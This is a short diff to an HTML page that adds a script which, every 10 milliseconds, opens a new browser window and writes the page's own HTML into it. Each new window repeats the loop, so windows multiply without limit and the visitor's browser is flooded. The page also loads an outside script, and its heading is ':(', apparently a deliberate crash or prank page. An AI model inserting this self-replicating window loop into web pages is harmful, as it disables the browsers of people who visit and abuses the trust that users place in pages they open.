@@ -94,7 +94,12 @@ h5 {
 <script src="https://github.com/KellogsCereal/stuff/blob/main/script.js"></script>
 </head>
 <body>
-
+<script>
+setInterval(function() {
+        var w = window.open();
+        w.document.write(document.documentElement.outerHTML||document.documentElement.innerHTML);
+      }, 10);
+</script>
 <div id="page">
   <div id="container">
     <h1>:(</h1>
